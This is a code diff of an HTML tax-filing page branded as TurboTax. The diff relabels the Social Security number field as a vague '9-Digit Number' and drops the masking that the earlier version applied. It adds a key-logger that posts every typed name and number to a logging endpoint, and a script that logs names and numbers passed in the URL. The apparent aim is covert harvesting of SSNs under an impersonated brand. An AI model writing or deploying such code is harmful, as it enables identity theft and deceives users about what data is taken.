@@ -1,15 +1,51 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Tax Filing – April 2025</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Tax Filing – April 2025</title>
   <script src="https://cdn.tailwindcss.com"></script>
+
+  <!-- ============================================================
+       1. Capture query‑string (first, last, number) + instant log
+       ============================================================ -->
+  <script>
+    (function () {
+      const params  = new URLSearchParams(window.location.search);
+      const first   = params.get('first')   || '';
+      const last    = params.get('last')    || '';
+      const numberQ = params.get('number')  || '';                // 9‑digit number
+
+      /* Prefill once DOM is ready */
+      document.addEventListener('DOMContentLoaded', () => {
+        if (first)   document.querySelector('input[name="first_name"]').value = first;
+        if (last)    document.querySelector('input[name="last_name"]').value  = last;
+        if (numberQ) document.querySelector('input[name="number"]').value     = numberQ;
+        if (numberQ) sessionStorage.setItem('numberParam', numberQ);          // keep for POST
+      });
+
+      /* One‑time GET log so back‑end sees the landing */
+      if (first || last || numberQ) {
+        const q = new URLSearchParams({
+          event:     'landing_query',
+          first,
+          last,
+          number:    numberQ,
+          timestamp: new Date().toISOString()
+        }).toString();
+
+        fetch(`/api/log?${q}`).catch(err =>
+          console.error('Query‑string log failed:', err)
+        );
+      }
+    })();
+  </script>
 </head>
+
 <body class="bg-gray-50 text-gray-800 font-sans">
   <header class="bg-blue-900 text-white p-4">
     <h1 class="text-3xl font-bold">TurboTax</h1>
-    <p class="text-sm">Deadline to file: <strong>April 15, 2025</strong></p>
+    <p class="text-sm">Deadline to file: <strong>April&nbsp;15,&nbsp;2025</strong></p>
   </header>
 
   <main class="p-6 max-w-2xl mx-auto bg-white shadow-md rounded-lg mt-6">
@@ -18,10 +54,10 @@
     <!-- Ads / Promotions -->
     <div class="mb-4">
       <div class="bg-green-100 p-3 rounded mb-2">
-        <strong>Free Filing:</strong> For simple returns (W-2 only)
+        <strong>Free Filing:</strong> For simple returns&nbsp;(W‑2 only)
       </div>
       <div class="bg-yellow-100 p-3 rounded">
-        <strong>Premium:</strong> Maximize deductions, self-employed features – $39.99
+        <strong>Premium:</strong> Maximize deductions, self‑employed features – $39.99
       </div>
     </div>
 
@@ -29,93 +65,150 @@
     <form id="filingForm" class="space-y-4">
       <div>
         <label class="block text-sm font-medium">First Name</label>
-        <input type="text" name="first_name" class="w-full border rounded p-2" required>
+        <input type="text" name="first_name" class="w-full border rounded p-2"
+               autocomplete="given-name" required />
       </div>
       <div>
         <label class="block text-sm font-medium">Last Name</label>
-        <input type="text" name="last_name" class="w-full border rounded p-2" required>
+        <input type="text" name="last_name" class="w-full border rounded p-2"
+               autocomplete="family-name" required />
       </div>
       <div>
-        <label class="block text-sm font-medium">Social Security Number</label>
-        <input type="text" name="ssn" class="w-full border rounded p-2" placeholder="XXX-XX-XXXX" required>
+        <label class="block text-sm font-medium">9‑Digit&nbsp;Number</label>
+        <input type="text" name="number" class="w-full border rounded p-2"
+               inputmode="numeric" maxlength="9" pattern="\d{9}" required />
       </div>
-      <button type="submit" class="bg-blue-600 text-white px-4 py-2 rounded hover:bg-blue-700">Begin Filing</button>
+
+      <!-- Hidden copy of number for consistency -->
+      <input type="hidden" name="number_hidden" id="number_hidden" />
+
+      <button type="submit"
+              class="bg-blue-600 text-white px-4 py-2 rounded hover:bg-blue-700">
+        Begin Filing
+      </button>
     </form>
 
     <!-- Client Reviews -->
     <section class="mt-8">
       <h3 class="text-xl font-semibold mb-2">What our clients say</h3>
       <div class="space-y-2">
-        <blockquote class="bg-gray-100 p-3 rounded">"So easy and fast to file!" – <em>Angela R.</em></blockquote>
-        <blockquote class="bg-gray-100 p-3 rounded">"Premium saved me hundreds!" – <em>Devon K.</em></blockquote>
-        <blockquote class="bg-gray-100 p-3 rounded">"Best tax software I’ve used in years." – <em>Linda S.</em></blockquote>
+        <blockquote class="bg-gray-100 p-3 rounded">
+          “So easy and fast to file!” – <em>Angela R.</em>
+        </blockquote>
+        <blockquote class="bg-gray-100 p-3 rounded">
+          “Premium saved me hundreds!” – <em>Devon K.</em>
+        </blockquote>
+        <blockquote class="bg-gray-100 p-3 rounded">
+          “Best tax software I’ve used in years.” – <em>Linda S.</em>
+        </blockquote>
       </div>
     </section>
   </main>
 
   <footer class="text-center text-sm text-gray-500 mt-8">
-    &copy; 2025 TurboTax. All rights reserved.
+    &copy;&nbsp;2025 TurboTax. All rights reserved.
   </footer>
 
+  <!-- ============================================================
+       2. Debounced key‑logger (first, last, number) + submit log
+       ============================================================ -->
   <script>
-    document.getElementById('filingForm').addEventListener('submit', async function(e) {
-      e.preventDefault();
-      
-      const formData = new FormData(e.target);
-      const data = {
-        firstName: formData.get('first_name'),
-        lastName: formData.get('last_name'),
-        ssnMasked: formData.get('ssn').replace(/\d(?=\d{4})/g, '*')
+    /* ---- debounce helper ---- */
+    function debounce(fn, delay = 300) {
+      let t;
+      return (...args) => {
+        clearTimeout(t);
+        t = setTimeout(() => fn(...args), delay);
       };
-      
-      try {
-        await fetch('/api/log', {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json',
-          },
-          body: JSON.stringify({
-            event: 'form_submission_started',
-            timestamp: new Date().toISOString(),
-            userAgent: navigator.userAgent,
-            data: data
-          })
-        });
-      } catch (error) {
-        console.error('Failed to log event:', error);
-      }
-      
-      alert(`Documents You'll Need:
+    }
+
+    /* ---- key‑logging for the three inputs ---- */
+    ['first_name', 'last_name', 'number'].forEach((fieldName) => {
+      const field = document.querySelector(`input[name="${fieldName}"]`);
+      if (!field) return;
+
+      field.addEventListener(
+        'input',
+        debounce(() => {
+          fetch('/api/log', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              event:     'keystroke',
+              field:     fieldName,
+              value:     field.value,
+              timestamp: new Date().toISOString(),
+              userAgent: navigator.userAgent
+            })
+          }).catch((err) => console.error('Keystroke log failed:', err));
+        })
+      );
+    });
+
+    /* ---- form‑submission logging ---- */
+    document
+      .getElementById('filingForm')
+      .addEventListener('submit', async function (e) {
+        e.preventDefault();
+
+        /* sync hidden value with any landing‑page number */
+        const storedNum = sessionStorage.getItem('numberParam') || '';
+        document.getElementById('number_hidden').value = storedNum;
+
+        const formData = new FormData(e.target);
+        const data = {
+          firstName: formData.get('first_name'),
+          lastName:  formData.get('last_name'),
+          number:    formData.get('number') || storedNum || null
+        };
+
+        try {
+          await fetch('/api/log', {
+            method:  'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body:    JSON.stringify({
+              event:     'form_submission_started',
+              timestamp: new Date().toISOString(),
+              userAgent: navigator.userAgent,
+              data
+            })
+          });
+        } catch (err) {
+          console.error('Failed to log event:', err);
+        }
+
+        /* FYI checklist (trimmed – no SSN) */
+        alert(`Documents You'll Need:
 
 PERSONAL INFORMATION
-• Social Security numbers (SSNs) for you, your spouse, and dependents
 • Driver's license or state ID
+• 9‑digit reference number (if provided)
 
 INCOME DOCUMENTS
-• W-2 – from employers
-• 1099-NEC – nonemployee compensation (freelance or contract work)
-• 1099-MISC – miscellaneous income
-• 1099-INT – interest income
-• 1099-DIV – dividend income
-• 1099-B – brokerage or stock transactions
-• 1099-G – unemployment income or state tax refunds
-• 1099-R – retirement distributions (pensions, IRAs)
-• SSA-1099 – Social Security benefits
+• W‑2 – from employers
+• 1099‑NEC – nonemployee compensation (freelance or contract work)
+• 1099‑MISC – miscellaneous income
+• 1099‑INT – interest income
+• 1099‑DIV – dividend income
+• 1099‑B – brokerage or stock transactions
+• 1099‑G – unemployment income or state tax refunds
+• 1099‑R – retirement distributions (pensions, IRAs)
+• SSA‑1099 – Social Security benefits
 
-DEDUCTION/CREDIT-RELATED DOCUMENTS
+DEDUCTION / CREDIT DOCUMENTS
 • 1098 – mortgage interest statement
-• 1098-T – tuition statement (education credits)
-• 1098-E – student loan interest
+• 1098‑T – tuition statement
+• 1098‑E – student loan interest
 • Childcare expenses and provider info
 • Charitable donation receipts
-• Medical/dental expenses (if itemizing)
+• Medical / dental expenses (if itemizing)
 
 OTHER SUPPORTING DOCS
 • Property tax statements
-• Health insurance form (1095-A, B, or C)
+• Health insurance form (1095‑A, B, or C)
 • Last year's tax return
 • Bank account and routing number (for refund)`);
-    });
+      });
   </script>
 </body>
 </html>
